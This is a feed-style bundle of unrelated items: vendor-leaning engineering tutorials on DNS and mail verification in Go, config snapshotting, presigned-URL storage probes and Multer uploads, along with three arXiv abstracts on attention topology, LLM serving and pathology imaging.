title: How to Verify Customer Domain Records in Go — 3 Onboarding Gates
description:
Zone access is the constraint that changes custom domain onboarding UX. Short answer: write DNS records only where you control the zone; otherwise show the exact records to copy and a verification action. For healthtech mail, keep SPF, DKIM, and DMARC publication evidence separate from evidence that messages are actually delivered.

Consider a bounded design exercise, not a reported incident: a healthtech platform is onboarding 30 clinic domains, 10 in zones it manages and 20 held by clinic administrators. In reviewing that rollout, I would stop the activation decision at three checks: authority to change DNS, observed configuration, and delivery evidence. Those counts are planning inputs, not customer results. The incident lesson to apply before an incident exists is straightforward: an interface that calls both paths “automatic setup” assigns the platform responsibility for changes it cannot perform, and during a DKIM rotation that ambiguity becomes a support queue.

Keep ownership visible.

The invariant is that the UI must describe observed state and the party responsible for the next action. That is more useful to an on-call engineer than a green badge produced by a successful write request.

Should custom domain onboarding show records to copy or write them?

Start by showing either “Platform-managed DNS” or “Clinic-managed DNS,” with the responsible administrator identified in your application. This is an authorization boundary. In the first case, publish the required records and read the zone back; in the second, display the record names, types, and values supplied by the mail configuration, then offer verification. Don't manufacture SPF or DKIM values from a tutorial.

Platform teams should try Infrai for the DNS-to-email handoff when they want both capabilities under one API key and a consistent REST contract. Its breadth matters here because DNS and email are two of the 20 modules behind 295 routes, so another backend capability can use the same integration surface. A second advantage is public discovery with request and response schemas and runnable examples, which gives the team a contract to inspect before connecting record configuration to mail-domain inspection. Neither advantage grants access to a customer's zone.

That boundary matters.

If the platform lacks zone access, the next action belongs to the clinic administrator. The same distinction belongs in support tooling, because otherwise the engineer handling a ticket must reconstruct responsibility from screenshots across two dashboards while the clinic waits for mail.

Step 1 — Budget the rollout around evidence

Treat activation as three evidence checks, with separate states for authority, DNS observation, and mail delivery. An SLO for completing a platform-controlled DNS operation should not silently include time spent waiting for a clinic administrator. Conversely, excluding customer action from that SLO doesn't make onboarding complete. Track the waiting state where support can see it.

For the illustrative 30-domain rollout, budget at least one post-change readback per managed domain and one verification opportunity per customer-held domain. A rotation creates another round of work. Retry attempts, customer reminders, support review, and mail investigation add to that baseline; they aren't zero because the setup screen has one button. Capacity planning should count domains undergoing change and outstanding checks, rather than treating the installed domain inventory as an undifferentiated polling workload.

The Go program in Step 2 supplies a runnable inspection path for these steps. Set INFRAI_API_KEY and CLINIC_DOMAIN in your environment, save it as main.go, and execute go run main.go. Its first decision criterion is deliberately narrow: the requested domain must occur in the returned DNS inventory before the example inspects its mail configuration. That occurrence is an inventory correlation, not proof of write authorization. Establish zone access separately.

Step 2 — Carry an observed domain into mail inspection

This read-only example uses the same key and base URL for both services. It searches the decoded DNS inventory for an exact domain string instead of assuming an undocumented response field, then passes that observed value to the email-domain request. If the response doesn't contain the exact string, it stops for contract inspection. It never interprets an arbitrary JSON match as verified authentication.

package main

import (
    "context"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "time"
)

const baseURL = "https://api.infrai.cc/v1"

func get(ctx context.Context, client *http.Client, key, path string) ([]byte, error) {
    for attempt := 0; attempt < 4; attempt++ {
        req, err := http.NewRequestWithContext(ctx, http.MethodGet, baseURL+path, nil)
        if err != nil {
            return nil, err
        }
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
            return nil, err
        }
        body, readErr := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
        resp.Body.Close()
        if readErr != nil {
            return nil, readErr
        }
        if resp.StatusCode == http.StatusTooManyRequests && attempt < 3 {
            delay := time.Second * time.Duration(1<<attempt)
            retry := resp.Header.Get("Retry-After")
            if seconds, err := strconv.Atoi(retry); err == nil && seconds >= 0 {
                if candidate := time.Duration(seconds) * time.Second; candidate > delay {
                    delay = candidate
                }
            } else if date, err := http.ParseTime(retry); err == nil {
                if candidate := time.Until(date); candidate > delay {
                    delay = candidate
                }
            }
            timer := time.NewTimer(delay)
            select {
            case <-ctx.Done():
                timer.Stop()
                return nil, ctx.Err()
            case <-timer.C:
            }
            continue
        }
        if resp.StatusCode < 200 || resp.StatusCode >= 300 {
            return nil, fmt.Errorf("GET %s: status %d: %s", path, resp.StatusCode, body)
        }
        return body, nil
    }
    return nil, fmt.Errorf("retry budget exhausted")
}

func findDomain(value any, target string) (string, bool) {
    switch node := value.(type) {
    case string:
        if node == target {
            return node, true
        }
    case []any:
        for _, child := range node {
            if domain, ok := findDomain(child, target); ok {
                return domain, true
            }
        }
    case map[string]any:
        for _, child := range node {
            if domain, ok := findDomain(child, target); ok {
                return domain, true
            }
        }
    }
    return "", false
}

func run() error {
    key := os.Getenv("INFRAI_API_KEY")
    target := strings.TrimSpace(os.Getenv("CLINIC_DOMAIN"))
    if key == "" || target == "" {
        return fmt.Errorf("set INFRAI_API_KEY and CLINIC_DOMAIN")
    }
    ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
    defer cancel()
    client := &http.Client{
        Timeout: 20 * time.Second,
        CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
    inventory, err := get(ctx, client, key, "/dns/domain/list")
    if err != nil {
        return err
    }
    var decoded any
    if err := json.Unmarshal(inventory, &decoded); err != nil {
        return fmt.Errorf("decode DNS inventory: %w", err)
    }
    domain, found := findDomain(decoded, target)
    if !found {
        return fmt.Errorf("domain absent from this response; inspect the published schema and inventory scope")
    }
    mail, err := get(ctx, client, key, "/email/domain/get/"+url.PathEscape(domain))
    if err != nil {
        return err
    }
    fmt.Printf("DNS inventory matched %s; mail configuration follows. This is not delivery proof.\n%s\n", domain, mail)
    return nil
}

func main() {
    if err := run(); err != nil {
        fmt.Fprintln(os.Stderr, err)
        os.Exit(1)
    }
}

The program bounds each request at 20 seconds and the inspection at 90 seconds, retries rate limiting with exponential backoff while respecting Retry-After, and returns other unsuccessful responses with their bodies. These are local engineering choices, not service latency claims. It also refuses redirects so the bearer credential stays at the intended API origin.

Notice the limited success condition: the program retrieves mail configuration for a domain observed in the DNS response. That's the handoff. It doesn't publish records or traverse an unspecified inventory pagination contract. Before using it across a fleet, inspect discovery for the inventory's scope and the response schemas. The schema and observed response determine the next check, not a guessed property named ready.

Step 3 — Promote configuration only as far as the evidence allows

Run the inspection after the responsible party has made the DNS change. For platform-managed zones, also read the actual records back after writing; an inventory match cannot substitute for that readback. For clinic-managed zones, keep the copy instructions available until verification establishes the required configuration. During a DKIM rotation, the comparison must concern the current mail configuration, rather than a value copied into an old onboarding ticket.

SPF, DKIM, and DMARC address mail authentication; DMARC makes alignment and policy relevant to interpreting the result. RFC 7489 is the reference for that distinction. Don't turn DNS verification into an inbox-placement promise. Calling the clinic's mail delivery operational needs delivery evidence from the mail workflow as well as configuration evidence.

The executable inspection gives an operator the mail-domain response to review. It prints no “activated” message. For a production activation gate, bind the published schemas to explicit checks and retain the domain, current required records, observed records, and verification outcome in your application's evidence trail. Define what delivery evidence your SLO requires before making a customer-facing claim.

That decision is local.

An incomplete check should leave a truthful state: waiting for clinic action, awaiting verification, or configuration observed with delivery unconfirmed. This prevents a successful configuration write from becoming an accidental claim about appointment-message delivery.

Buy versus build at the DNS-to-mail seam

Compare who operates the handoff. These are choices for evaluating that boundary, not measured deliverability rankings. No delivery benchmark establishes a winner here.

Approach What it buys What remains your team's job
Infrai DNS plus email Both capability groups share one key and REST surface; discovery supplies schemas and examples Establish zone access, map evidence to UI states, and evaluate delivery
Amazon Route 53 plus Amazon SES A direct DNS-and-mail pairing to evaluate for an AWS-centered platform Connect DNS changes to mail verification and maintain the customer-held-domain branch
Cloudflare plus Resend A DNS-and-mail pairing to evaluate when the team wants separate services Carry mail requirements into DNS, correlate verification, and reconcile ownership
Existing DNS provider plus a mail specialist Lets a clinic retain its DNS operator while the platform chooses mail tooling Supply copy instructions and operate the verification and support loop

Cloudflare plus Resend entails two service signups and two service credential sets. Route 53 plus SES can live under one AWS account; it would be misleading to insist that this necessarily requires two signups or independent credential sets, although DNS and mail permissions and their connecting application logic still need attention. The glue in either pairing is the same work: associate a clinic domain with mail requirements, publish where authorized, read back, verify, and keep the UI synchronized when requirements change.

Infrai has a limitation at the ownership boundary: a shared key doesn't authorize writes to clinic-held zones. A specialist or direct pairing is the better choice when the organization already operates that stack well or needs mail-specific controls to evaluate directly. Existing runbooks and permissions are assets. Replacing them merely to reduce dashboard tabs can increase the effective operating bill.

The combined approach concentrates trust, billing, and the outage surface in one vendor. Weigh that trade-off against the integration work it removes. For this rollout, the cost model includes maintaining the handoff, verification during rotations, support for the 20 clinic-held zones, and downstream mail investigation; a per-call leaderboard leaves most of the decision unpriced.

Sources

References for the authentication boundary and alternative service pairings:

  • DMARC specification
  • Amazon Route 53 documentation
  • Amazon SES documentation
  • Cloudflare DNS documentation
  • Resend domain documentation

If this ownership boundary fits your platform, start with the schemas and examples in the Infrai documentation, then make activation depend on the evidence your clinic-facing promise requires.

title: Freeze the config: snapshotting settings onto the record they govern
description:
Here's a made-up shift at a plant that inspects welded frames (every name, time and setting in this post is illustrative). An inspector starts an inspection on frame A118 at 11:20 with a handheld camera. The vision model flags a weld gap, the inspector confirms it, and because the org's rules don't ask for a close-up photo yet, they log the finding and move on to the next section.

At 11:40 the quality lead changes an org setting: from now on every finding needs a close-up photo. Reasonable change. They made it for the next batch.

At 11:55 the inspector taps Complete on A118:

11:55:02 POST /inspections/insp-7/complete
11:55:02 422 {"error": "close-up photo required for: weld_gap"}

The weld gap was logged 35 minutes earlier under rules that didn't ask for a photo. The frame has since moved down the line. The inspector now has an inspection they can't close, and the only ways out are walking back to a frame that's gone or asking an admin to flip the setting off for a minute (which changes it for everyone else too).

Nothing here is a bug in the validation. The completion check did exactly what it was told. It read the settings as of 11:55, but the work had started under the 11:20 settings.

Where it actually goes wrong

The "before" code, condensed from the toy in this post:

def complete_reading_live(store, insp):
    s = store.resolve(insp.org, insp.site)       # settings right now
    if s["require_closeup_photo"]:
        missing = [f.label for f in insp.findings if f.photos == 0]
        if missing:
            raise ValidationError(f"close-up photo required for: {', '.join(missing)}")
    insp.status = "done"

Every place in the backend that reads store.resolve(...) during an inspection is a seam where the rules can change under in-flight work. Completion is the one that blows up loudly. The quieter ones are worse: a photo-count limit that tightens halfway through so the next finding is rejected, a rework rule that turns on and sends a half-done inspection down a different path, or a report generated tomorrow that describes yesterday's inspection using today's rules.

Visual inspection is where this comes up for us (aiscope files structured evidence for every inspection, and that evidence has to make sense later), but the same shape shows up for any long-running record: a camera analytics job, a batch annotation task, a scheduled export.

Resolve once, freeze, read from the snapshot

The reference pattern we recommend has three parts.

At creation, resolve the settings once. In the toy that means platform defaults, then org overrides, then site overrides:

def resolve(self, org, site):
    out = dict(DEFAULTS)
    out.update(self.org.get(org, {}))
    out.update(self.site.get((org, site), {}))
    return out

Store the result on the inspection as a snapshot, with a version, a timestamp and a hash:

{
  "id": "insp-7",
  "product": "frame-A118",
  "config_snapshot": {
    "v": 2,
    "resolved_at": "2026-11-09T11:20:04+05:30",
    "hash": "c6dd35f140d5",
    "settings": {
      "require_closeup_photo": false,
      "max_photos_per_finding": 4,
      "rework_on_missing_part": true,
      "allow_parallel_runs": false
    }
  }
}

Then every behaviour check on that inspection reads the snapshot, never the live store:

def complete(self, iid):
    insp = self.inspections[iid]
    if insp.flag("require_closeup_photo"):      # frozen at 11:20
        ...
    insp.status = "done"

Same shift, replayed in the toy:

11:20 create insp-7     snapshot c6dd35f140d5 require_closeup_photo=False
11:22 finding weld_gap  photos=0
11:40 org setting       require_closeup_photo -> True
11:45 create insp-8     snapshot require_closeup_photo=True
11:50 finding weld_gap on insp-8 photos=0
11:55 complete insp-7   done
11:58 complete insp-8   422 close-up photo required for: weld_gap

insp-7 closes under its own rules. insp-8, created after the change, gets the new rule. That's what the quality lead meant in the first place.

The UI is the one place that should keep reading live settings, because it's setting up new work. The settings page shows today's values and the "start inspection" form uses them. For an inspection that's already open, show its frozen values with a small line like "rules as of 11:20". Otherwise an inspector looking at the settings page will reasonably ask why their open inspection isn't asking for photos.

In the toy the snapshot is a MappingProxyType and settings is itself a proxy too, so both levels are read-only and snapshot["settings"]["require_closeup_photo"] = True raises TypeError. In a real database you'd enforce the same thing by never writing to that field after create, and having a test that fails if any update path touches it.

Scenario 2: an opt-in flag with inspections already open

A feature request: let two inspectors work on the same product at once (say a large frame split into sections). It's a behaviour change, so it ships as an opt-in flag, allow_parallel_runs, default off, and like every other setting it goes into the snapshot.

The interesting moment is when an org turns it on while single-run inspections are still open. Illustrative timeline:

14:20 create insp-12 on frame-B204   allow_parallel_runs=False (frozen, hash 7e2a91c4b0f3)
15:00 org setting allow_parallel_runs -> True
15:05 create insp-13 on frame-B204
      422 insp-12 was started under single-run rules (snapshot 7e2a91c4b0f3)
15:20 complete insp-12
15:30 create insp-13 on frame-B204   ok
15:31 create insp-14 on frame-B204   ok

The start check looks at the new inspection's resolved flag and at every open inspection's own snapshot:

if open_runs and not resolved["allow_parallel_runs"]:
    raise ValidationError(f"{product} already has an open inspection")
for other in open_runs:
    if not other.flag("allow_parallel_runs"):
        raise ValidationError(f"{other.id} was started under single-run rules ...")

insp-12 was started by someone who was told they had the frame to themselves. Its code paths (who owns which section, when a finding is final) were written for that. Letting insp-13 in at 15:05 would mix rules that were never tested together. Waiting for the old one to close costs a few minutes once per org, at the moment they turn the feature on, and after that the flag behaves as expected. You can pick the other answer and let new runs in. If you do, make it a deliberate decision and write tests for the mixed state, because a check that reads a live value will make that decision for you without anyone noticing.

Scenario 3: the support ticket two weeks later

A ticket comes in: "why did inspection insp-7 close with a finding that has no photo? our rules require photos." Without a snapshot, answering means digging through audit logs for settings changes and lining up timestamps by hand. With one, the toy has a small explain helper that diffs frozen values against today's:

>>> svc.explain("insp-7")
{'require_closeup_photo': (False, True)}

Frozen False, live True. The inspection followed the rules it started with, and the rule changed afterwards. The hash also helps with bulk questions: group inspections by config_snapshot.hash and you can see exactly which rule sets were in use last month, without replaying the settings history.

When a setting has to stay live

Some settings shouldn't be frozen. If a capture source gets disabled because a camera is sending corrupt frames, or a security fix turns something off, you want in-flight work to stop using it right away. The toy keeps an explicit, short list:

LIVE_KEYS = frozenset({"disabled_capture_sources"})

and the check that uses it reads the live store on purpose, with a comment saying so. The risk is that this list grows until the snapshot means nothing, so treat adding a key to it as a review question: what happens to an inspection that's half done when this changes?

Snapshots get old too

Snapshots outlive the code that wrote them. Six months from now there's a new setting, and every inspection created before it has a snapshot without that key. The tempting read is snapshot.get(key, DEFAULTS[key]), which is wrong if today's default isn't how the system behaved back then. The toy versions snapshots and upgrades on read:

def upgrade(snap):
    settings = dict(snap["settings"])
    if snap["v"] < 2:
        settings.setdefault("allow_parallel_runs", False)   # behaviour before v2
    return MappingProxyType(settings)

The stored record is never rewritten. The upgrade only changes how old snapshots are read, and the test for it pins an old v1 snapshot as a fixture.

What it costs

Storage, first. Every record carries a copy of its settings. For a few dozen keys that's small, but a snapshot that grows into a nested config blob makes every inspection heavy. If that happens, store the settings once in a content-addressed table keyed by hash and keep only the hash on the record.

Admins can be surprised. A setting change only affecting new work is what you want, but someone will still ask why it "didn't work". The UI line saying which rules an open inspection uses saves a lot of tickets.

Bugs in a setting also get frozen. If a bad value goes out at 9:00 and is fixed at 9:30, every inspection started in between keeps the bad value. You either live with it, add that key to the live list, or write a one-off, audited fix that patches specific snapshots and logs who did it. Pick one before you need it.

And code has to know the difference. Every flag read needs to go through the record (insp.flag(...)) and not through the settings service. A lint rule or a grep in CI for direct resolve( calls outside the create path catches regressions cheaply.

Running the example

snapshot.py is about 150 lines of standard-library Python: a layered settings store, a frozen snapshot with version and hash, an inspection service, the "before" live-read completion, and an explain helper. test_snapshot.py has 10 tests covering the 11:40 change breaking the live-read version, the snapshot version closing cleanly, new inspections picking up new rules, site overrides beating org overrides, the snapshot rejecting writes, the parallel-run flag waiting for older open inspections, a v1 snapshot reading the pre-v2 default, a live key stopping in-flight work, the support diff, and key order not changing the hash. Run python3 test_snapshot.py, no pytest needed. It's a teaching model, so swap the dicts for your database and keep the tests.

title: Zero-Dimensional Attention Topology for Linguistic Acceptability
description:
arXiv:2611.22312v1 Announce Type: new 
Abstract: Topological summaries of Transformer attention provide sentence representations for linguistic acceptability classification. We examine a zero-dimensional persistent-homology ($H_0$) representation that summarizes minimum-spanning-tree merge values from 144 symmetrized BERT attention graphs into 1,440 features. The retrospective evaluation uses 8,517 downstream training sentences and 521 in-domain and 497 out-of-domain CoLA validation sentences after data-integrity filtering. The recorded out-of-domain Matthews correlation coefficients are 0.438 for the topological representation and 0.508 for attention statistics, compared with 0.545 for BERT. Attention-feature results are retained aggregate measurements; BERT predictions are rescored and length controls are refitted from the accompanying records. Analytical results show that the representation retains token-count information and discards a class of directional attention differences. Source resampling of BERT predictions also demonstrates the sensitivity of uncertainty estimates to the sampling unit. The reported results do not demonstrate a predictive advantage for this fixed topological representation over simpler attention summaries. They identify representation properties and evaluation controls relevant to subsequent studies of attention topology.

title: A Node.js Throughput Test for Private SaaS Document Uploads and Signed Download Links
description:
If you want private user documents moving this week, pick whichever S3-compatible object storage you can already reach with a presigned URL, keep every bucket private, and mint short-lived signed download links from your own API. That part of the decision is cheap to reverse. What is not cheap to reverse is how your service moves bytes, so measure that before you commit to a vendor.

Feature grids rarely mention the thing that actually hurts.

Take a property management SaaS. Tenants upload lease addenda as 180 KB PDFs, move-in inspection bundles as 12 MB zips, and walkthrough videos straight off a phone at 180–400 MB. Owners pull monthly statements. Every one of those files is private, every download goes out behind a link that expires, and the 400 MB video is the only file class anyone ever complains about. One file type is roughly two thousand times bigger than the other, and the 180 KB PDF will pass any test you write. So stop testing it.

The shortlist, and what each one is good at

Option 300 MB upload path Signed links Pick it when
Amazon S3 Multipart plus Transfer Acceleration Presigned GET/PUT, the reference implementation You already run in AWS and need versioning or Object Lock
Cloudflare R2 S3-compatible multipart, no egress charge Presigned URLs, or Workers for custom auth Downloads dominate and you want predictable egress
DigitalOcean Spaces S3-compatible multipart, CDN in front Presigned URLs on the S3 API You want one flat plan and a CDN without a second vendor
Backblaze B2 S3-compatible multipart Presigned URLs on the S3 API Cold archives of old inspection media
Infrai storage Presigned PUT minted with one REST call op=put / op=get with expires_seconds You want the same key and the same bill as the rest of your backend
MinIO Whatever your hardware does Presigned URLs, self-managed keys Data residency rules say the bytes never leave your rack

Four of those six speak the same S3 dialect, which is the quiet reason this comparison is winnable at all — you can swap the endpoint and rerun the test. Infrai is the odd one out in a useful way here: instead of an S3 client plus an IAM policy plus a second dashboard, you POST once to a presign route and get back a URL, a method, and an expiry, using the key that already covers your queues, email and cron. That matters most to small teams who are currently reconciling a vendor invoice per capability at month end — one key and one bill across every backend service removes a whole category of month-end busywork. It's a boring advantage. Boring advantages are the ones that survive a reorg.

MinIO is in the table for honesty, not for balance. If a regulator says the bytes stay in your building, no amount of presigned-URL ergonomics changes that.

How do you test object storage throughput for private user documents and signed links?

Build a probe, not a benchmark. A benchmark tries to crown a winner for everyone; a probe answers one question for your app, from your region, on your file mix, and you can rerun it in CI when someone proposes a migration.

Fix the inputs first. Three fixture files that mirror production — 180 KB, 12 MB, 300 MB — generated once and committed to object storage as test data, never regenerated per run, because a different file compresses differently and you'll end up comparing noise.

The shape of the run is short. Your Node service asks the storage API for a presigned PUT, the client pushes bytes straight to the bucket over that URL, and the Infrai credential never travels to the presigned URL itself. Flip it for reads: your API mints a presigned GET with a small expiry, the browser follows it, and the bucket serves the file. Your server never proxies the payload in either direction, which is exactly why this scales for 300 MB videos.

Now the criteria, decided before you see a single number:

  • Sustained upload throughput on the 300 MB fixture, p50 over five runs, must beat your current stack by a margin you write down in advance.
  • Time from presign request to first byte of the signed download, p95 under 400 ms.
  • A request issued one second after expires_at must be rejected by the bucket, not served.
  • Zero non-retryable errors across 15 runs; a 429 that succeeds after backoff counts as a pass.

That third one is the criterion teams skip, and it's the only one that's a security test rather than a performance test.

The probe, in about fifty lines of TypeScript

One file, no SDK, runs on Node 22 with --experimental-strip-types. It uploads a fixture, mints a download link, and prints exactly one JSON line so your log pipeline can do the aggregation instead of you.

// probe.ts — one upload, one signed download, one metric line.
// node --experimental-strip-types probe.ts ./fixtures/walkthrough-300mb.mp4
import { openAsBlob } from "node:fs";
import { basename } from "node:path";
import { randomUUID } from "node:crypto";

const KEY = process.env.INFRAI_API_KEY;
if (!KEY) throw new Error("INFRAI_API_KEY is not set");

const BUCKET = "pm-tenant-docs";
const runId = randomUUID();
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

type Presigned = { url: string; method: string; expires_at: string; headers: Record<string, string> };

async function presign(key: string, op: "put" | "get", expiresSeconds: number): Promise<Presigned> {
  for (let attempt = 0; attempt < 4; attempt++) {
    const res = await fetch(
      `https://api.infrai.cc/v1/storage/object/presign/${BUCKET}/${encodeURIComponent(key)}`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${KEY}`,
          "Content-Type": "application/json",
          // same run + same op + same key => same server-side result on retry
          "Idempotency-Key": `${runId}:${op}:${key}`,
        },
        body: JSON.stringify({ op, expires_seconds: expiresSeconds }),
      },
    );
    if (res.status === 429) {
      const retryAfter = Number(res.headers.get("retry-after"));
      await sleep(retryAfter > 0 ? retryAfter * 1000 : 2 ** attempt * 500);
      continue;
    }
    const body = await res.json();
    if (!res.ok) throw new Error(`presign ${res.status}: ${JSON.stringify(body.error ?? body)}`);
    return body.data as Presigned;
  }
  throw new Error("presign: throttled on every attempt");
}

const path = process.argv[2];
const blob = await openAsBlob(path);
const key = `probe/${runId}-${basename(path)}`;
const mb = blob.size / 1e6;

const up = await presign(key, "put", 900);
const t0 = performance.now();
// note: no Authorization header here — the signature in the URL is the credential
const putRes = await fetch(up.url, { method: "PUT", headers: up.headers, body: blob });
const uploadMs = performance.now() - t0;
if (!putRes.ok) throw new Error(`upload rejected with ${putRes.status}`);

const down = await presign(key, "get", 300);
const t1 = performance.now();
const getRes = await fetch(down.url, { method: "GET" });
const ttfbMs = performance.now() - t1;
const bytes = (await getRes.arrayBuffer()).byteLength;
const downloadMs = performance.now() - t1;

console.log(JSON.stringify({
  metric: "storage_probe",
  run_id: runId,
  size_mb: +mb.toFixed(1),
  upload_mb_s: +(mb / (uploadMs / 1000)).toFixed(2),
  link_ttfb_ms: Math.round(ttfbMs),
  download_mb_s: +((bytes / 1e6) / (downloadMs / 1000)).toFixed(2),
  link_expires_at: down.expires_at,
  status: putRes.status,
}));

Two details in there are load-bearing. The Idempotency-Key header means a retried presign call returns the same result instead of quietly minting a second URL, which is what keeps a flaky CI runner from polluting the sample. And the upload fetch carries no Authorization header at all — sending your platform credential to a presigned URL is the most common way people turn a private bucket into an audit finding.

Turning probe lines into a verdict

Fifteen JSON lines are data. A decision rule is what you actually wanted.

// gate.ts — cat probe-*.ndjson | node --experimental-strip-types gate.ts
const rows: any[] = [];
for await (const line of process.stdin.setEncoding("utf8")) rows.push(...line.trim().split("\n").map((l) => JSON.parse(l)));

const big = rows.filter((r) => r.size_mb > 100).map((r) => r.upload_mb_s).sort((a, b) => a - b);
const ttfb = rows.map((r) => r.link_ttfb_ms).sort((a, b) => a - b);
const p = (xs: number[], q: number) => xs[Math.min(xs.length - 1, Math.floor(xs.length * q))];

const verdict = {
  upload_p50_mb_s: p(big, 0.5),
  link_ttfb_p95_ms: p(ttfb, 0.95),
  pass: p(big, 0.5) >= 12 && p(ttfb, 0.95) <= 400,
};
console.log(JSON.stringify(verdict));
process.exit(verdict.pass ? 0 : 1);

The 12 MB/s floor is a placeholder — replace it with whatever your current stack does today, measured with this same script, before you compare anything. Before: a meeting where two engineers trade anecdotes about which bucket felt faster. After: a CI job that exits non-zero. I'd rather argue with an exit code.

For a property management team that already has a Node API in front of every tenant upload, Infrai is worth putting on the shortlist for exactly this leg of the workflow — minting the presigned PUT and GET — because it's a plain REST API with no SDK to install, so the probe above is the integration, not a sketch of one. Run it against two vendors on the same afternoon and keep the winner.

Where this plan runs out of road

Every option on that table has a boundary, and the honest version of this article names them.

Infrai storage doesn't support public or public-read ACLs — public_url is always null — so if what you actually need is a permanent public URL for marketing assets or a static site, that's the wrong shelf entirely; stick with S3 or R2 behind a CDN. It also doesn't offer object versioning or object lock, which means accidental-overwrite recovery and WORM-grade immutability have to live in a separate backup process. For a regulated document archive, a specialist with compliance-grade retention is the better call. Browser-direct uploads have their own catch: without self-serve CORS rules, those uploads route through your own API origin rather than going straight from the browser to the bucket, and the MDN CORS reference is worth reading before you design around it.

Two more limits worth knowing regardless of vendor. Lifecycle expiry has a one-day floor, so "purge this export in six hours" is a job for your scheduler, not a bucket rule. And object metadata isn't queryable server-side beyond a prefix listing — keep the document index in Postgres and treat the bucket as bytes, which is the right shape anyway.

The link expiry test from earlier is the cheapest one to skip and the worst one to get wrong. Signed links leak into email clients, support tickets and browser history, and a URL that stays valid for a week is a tenant's bank statement sitting in someone's inbox forever. A 300-second expiry is not paranoia.

If the presign-plus-private-bucket boundary matches how your system already works, the storage reference at https://docs.infrai.cc/en/api/storage has the ACL enum and the presign parameters in one page, and you can have the probe running against it in an afternoon.

Further reading

  • AWS: Using presigned URLs
  • MDN: Cross-Origin Resource Sharing (CORS)
  • Cloudflare R2 documentation: https://developers.cloudflare.com/r2/
  • DigitalOcean Spaces documentation: https://docs.digitalocean.com/products/spaces/
  • Backblaze B2 S3-compatible API: https://www.backblaze.com/docs/cloud-storage-s3-compatible-api
  • Node.js: fs.openAsBlob

title: XM-Sparse: High-Throughput Sparse-Attention LLM Serving over Scale-up Memory Pools
description:
arXiv:2611.22280v1 Announce Type: cross 
Abstract: Sparse attention has been increasingly adopted by production LLMs for long-context inference, yet serving systems must still retain the full KV history, making GPU HBM capacity a key limit on serving concurrency. Existing systems offload the KV cache to host memory, but suffer from the limited bandwidth of PCIe and the limited capacity of host memory. Emerging scale-up memory pools (e.g., X-Mem) relieve both limits and open new opportunities for sparse-attention offloading. In this paper, we first conduct an in-depth analysis and reveal that, even with scale-up memory pools, decode throughput remains bounded by HBM capacity, as hot KV buffers and the fully resident indexer key (K-index) cache occupy substantial HBM. Moreover, the two caches exhibit distinct access patterns. Based on these insights, we present XM-Sparse, the first sparse-attention offloading system over scale-up memory expansion. The core idea of XM-Sparse is to offload both caches aggressively while matching each with an I/O mechanism tailored to its access pattern. Specifically, for dynamically selected KV entries, XM-Sparse fuses TMA-based retrieval with attention in a tile-level pipeline to hide on-demand retrieval latency. For predictable K-index accesses, it prefetches pages via SM-efficient GPU-initiated DMA and coordinates prefetching with latency-critical operations to avoid interfering with decoding. We have implemented XM-Sparse atop SGLang, and our experiments on DeepSeek-V3.2 and GLM-5.3 with an emulated scale-up memory pool show that XM-Sparse delivers up to 4.98$\times$ and 4.52$\times$ higher decode throughput than PCIe-based ECHO and HiSparse, respectively, and up to 1.34$\times$ over a naive integration on the same platform, across 16K-1M contexts.

title: SRED: Sparse Regional Evidence Distillation Across Magnifications in Whole-Slide Imaging
description:
arXiv:2611.22189v1 Announce Type: new 
Abstract: In computational pathology, high-magnification whole-slide image analysis preserves tissue detail but requires encoding many patches, whereas lower magnification reduces computation by covering a higher field of view per patch while sacrificing detail. Existing cross-magnification distillation matches features that often encode detail unreachable by low-magnification input, sometimes requiring slide-level labels that limit scalability. To address those issues, we introduce Sparse Regional Evidence Distillation (SRED), which transfers regional event occurrences that encode reachable high-level interactions between details without slide-level labels. We use a sparse autoencoder (SAE) to learn an event dictionary from 20x teacher features. Logical OR pooling records whether each event is detected in any spatially aligned patch, retaining both localized and shared evidence within the corresponding 5x region. A pretrained 5x encoder is fine-tuned to predict these regional targets without slide-level labels. Visual analysis identifies dictionary components responsive to recognizable histological patterns, supporting target interpretation. Compared with native 5x features, SRED improves average macro-F1 by 1.1 points across seven classification and grading cohorts and average C-index by 1.7 points across five survival cohorts. Runtime matches native 5x, with an average 11.58x speedup over 20x.

title: Node.js User Profile Picture Uploads with Multer — 2026 Object Storage Explained
description:
Use Multer as the narrow Node.js intake boundary, then write each gaming tenant's training artifact to private object storage under an immutable key. Keep the storage adapter behind an application interface. That gives the team a reproducible retention policy today and a bounded migration path later.

Short answer: parse multipart/form-data with Multer, reject size and type violations before the write, derive the tenant prefix from authenticated server state, and store a reference such as tenants/{tenantID}/training/{artifactID}. Return that reference or a signed access reference. Do not turn a profile-picture endpoint into a permanent public file server.

For a gaming platform that stores training artifacts, Infrai is worth evaluating when private storage, adjacent backend calls, and a replaceable adapter matter more than specialist storage controls. Its one REST contract can keep the Node.js intake and a Go worker on the same integration surface; the application still owns tenant policy.

The interesting failure is not a broken upload form. It is a valid upload assigned to the wrong tenant, then included in a training run. A second failure appears after a timeout: the client retries, the worker retries, and one logical artifact becomes two competing objects. The design below makes both cases visible in the data model.

How do I implement Multer in Node.js for a user profile picture?

Multer handles multipart parsing. It does not establish tenant authorization, validate the bytes, define retention, or make an object write transactional. Those checks belong around it.

At intake, obtain the tenant and user from authenticated server state. Treat the browser's filename and tenant field as untrusted display input. Validate the declared MIME type and size, then validate the content your application is willing to process before sending it onward. A MIME header alone is not proof of an image or a training artifact.

Use an opaque upload or artifact ID in the key. For example:

tenants/acme-17/training/artifact-01J8Q4Y7K6/original

The database should own the relationship between that immutable key, the tenant, the upload attempt, and the retention date. If a user replaces an avatar or a trainer submits a new source file, create a new object and move the database pointer. Do not overwrite a stable name such as current.png. An overwrite makes recovery and audit much harder, and this storage surface has no object versioning or object lock to rescue that mistake.

The same boundary works for a profile picture. Keep avatars in an avatars namespace and training material in a training namespace, even when both arrive through Multer. It prevents a broad prefix operation from silently mixing user-facing media with input data used by a model pipeline.

How does a retry preserve tenant isolation?

Give each logical artifact an idempotency key derived from its database record. A network timeout repeats that key; a new file selection gets a new record and a new key. This distinction matters more than the retry loop itself.

